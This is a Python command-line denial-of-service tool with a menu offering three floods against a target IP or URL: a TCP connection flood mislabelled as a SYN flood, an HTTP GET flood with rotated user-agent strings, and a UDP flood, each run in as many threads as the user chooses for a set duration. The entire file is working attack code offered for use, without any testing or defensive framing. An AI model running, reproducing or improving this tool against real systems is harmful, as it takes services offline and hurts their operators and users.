import os
import time
import socket
import threading
import random
import requests
from colorama import init, Fore, Style

# Initialize colorama
init()

# Green banner
def print_banner():
    banner = r"""
  ████░░██████████████████████████░░████
     ███░░████░░░░░██░░██░░██░░░░░████░░███
    ███░███░░███░░███░░███░░███░░███░███░███
   ███░███░░███░░███░░███░░███░░███░███░░███
    ███░███░░███░░███████████░░███░███░███
     ████░░████░░███░██░░███░░████░░████
       █████████████░██░░██░██████████
        ░░░░░░░░░░░░░████░░░░░░░░░░░░
    """
    print(Fore.GREEN + Style.BRIGHT + banner.center(80) + Style.RESET_ALL)
    print(Fore.GREEN + "By Mohd Eisa\n                    & Design-Style By Akshay Jain".center(80) + Style.RESET_ALL)
    print("\n")

# ddos 1: SYN Flood
def ddos1(target_ip, target_port, duration):
    print(Fore.GREEN + f"[ddos 1] Attacking {target_ip}:{target_port}" + Style.RESET_ALL)
    end_time = time.time() + duration
    while time.time() < end_time:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(2)
            s.connect((target_ip, target_port))
            s.send(random._urandom(1024))
            print(Fore.RED + f"[ddos 1] Packet sent to {target_ip}" + Style.RESET_ALL)
            s.close()
        except:
            pass

# ddos 2: HTTP Flood
def ddos2(target_url, duration):
    print(Fore.GREEN + f"[ddos 2] Attacking {target_url}" + Style.RESET_ALL)
    end_time = time.time() + duration
    while time.time() < end_time:
        try:
            headers = {
                'User-Agent': random.choice([
                    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
                    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36',
                    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36'
                ])
            }
            requests.get(target_url, headers=headers)
            print(Fore.RED + f"[ddos 2] Request sent to {target_url}" + Style.RESET_ALL)
        except:
            pass

# ddos 3: UDP Flood
def ddos3(target_ip, target_port, duration):
    print(Fore.GREEN + f"[ddos 3] Attacking {target_ip}:{target_port}" + Style.RESET_ALL)
    end_time = time.time() + duration
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    while time.time() < end_time:
        try:
            sock.sendto(random._urandom(1024), (target_ip, target_port))
            print(Fore.RED + f"[ddos 3] Packet sent to {target_ip}" + Style.RESET_ALL)
        except:
            pass
    sock.close()

# Main menu
def main():
    os.system('clear')
    print_banner()
    print(Fore.YELLOW + "Choose Your Option".center(80) + Style.RESET_ALL)
    print(Fore.CYAN + "1 - ddos 1 (SYN Flood)".center(80) + Style.RESET_ALL)
    print(Fore.CYAN + "2 - ddos 2 (HTTP Flood)".center(80) + Style.RESET_ALL)
    print(Fore.CYAN + "3 - ddos 3 (UDP Flood)".center(80) + Style.RESET_ALL)
    print(Fore.CYAN + "4 - Exit".center(80) + Style.RESET_ALL)

    choice = input(Fore.GREEN + "\nYour choice (1-4): ".center(80) + Style.RESET_ALL)

    if choice == '1':
        target_ip = input(Fore.CYAN + "Enter target IP: " + Style.RESET_ALL)
        target_port = int(input(Fore.CYAN + "Enter port (e.g., 80): " + Style.RESET_ALL))
        duration = int(input(Fore.CYAN + "Attack duration (seconds): " + Style.RESET_ALL))
        threads = int(input(Fore.CYAN + "Number of threads: " + Style.RESET_ALL))
        for _ in range(threads):
            threading.Thread(target=ddos1, args=(target_ip, target_port, duration)).start()
    elif choice == '2':
        target_url = input(Fore.CYAN + "Enter target URL (e.g., http://example.com): " + Style.RESET_ALL)
        duration = int(input(Fore.CYAN + "Attack duration (seconds): " + Style.RESET_ALL))
        threads = int(input(Fore.CYAN + "Number of threads: " + Style.RESET_ALL))
        for _ in range(threads):
            threading.Thread(target=ddos2, args=(target_url, duration)).start()
    elif choice == '3':
        target_ip = input(Fore.CYAN + "Enter target IP: " + Style.RESET_ALL)
        target_port = int(input(Fore.CYAN + "Enter port (e.g., 53): " + Style.RESET_ALL))
        duration = int(input(Fore.CYAN + "Attack duration (seconds): " + Style.RESET_ALL))
        threads = int(input(Fore.CYAN + "Number of threads: " + Style.RESET_ALL))
        for _ in range(threads):
            threading.Thread(target=ddos3, args=(target_ip, target_port, duration)).start()
    elif choice == '4':
        print(Fore.RED + "Exiting...".center(80) + Style.RESET_ALL)
        exit()
    else:
        print(Fore.RED + "Invalid input, please try again.".center(80) + Style.RESET_ALL)
        time.sleep(2)
        main()

if __name__ == "__main__":
    main()

print("Ddos Attack Complete")